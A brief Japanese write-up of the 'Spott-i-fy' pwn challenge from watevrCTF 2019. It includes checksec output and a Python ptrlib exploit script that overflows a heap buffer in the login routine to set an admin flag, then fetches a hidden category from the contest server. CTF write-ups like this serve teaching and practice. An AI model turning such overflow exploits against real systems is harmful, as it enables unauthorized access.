# [pwn 304pts] Spott-i-fy - watevrCTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f spottify
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               3       spottify
```
loginにヒープオーバーフローがあります。
adminになるフラグ的なのがあるので追記します。
```python
from ptrlib import *

def register(username, password, nofill=False):
    sock.sendline("r")
    sock.sendline(username)
    if nofill:
        sock.sendline(password)
    else:
        sock.sendline(password + b'\x00' * (30 - len(password)))
    sock.recvline()

def login(username, password):
    sock.sendline("l")
    sock.sendlineafter(": ", username)
    sock.sendlineafter(": ", password)
    sock.sendlineafter(": ", "n")

def fetchall():
    sock.sendline("Fetch *")

def fetch(cat1, cat2, cat3):
    sock.sendline("Fetch {} {} {}".format(cat1, cat2, cat3))

def logout():
    sock.sendline("Logout")
    sock.recvline()

#sock = Process("./spottify")
sock = Socket("13.48.149.167", 50000)
sock.recvline()

login("taro", "A" * 30 + "taw")
fetch("watpop", "KNAAN", "\xf0\x9d\x93\xaf\xf0\x9d\x93\xb5\xf0\x9d\x93\xaa\xf0\x9d\x93\xb0")

sock.interactive()
```

# 感想
簡単だけどrevがつらいです。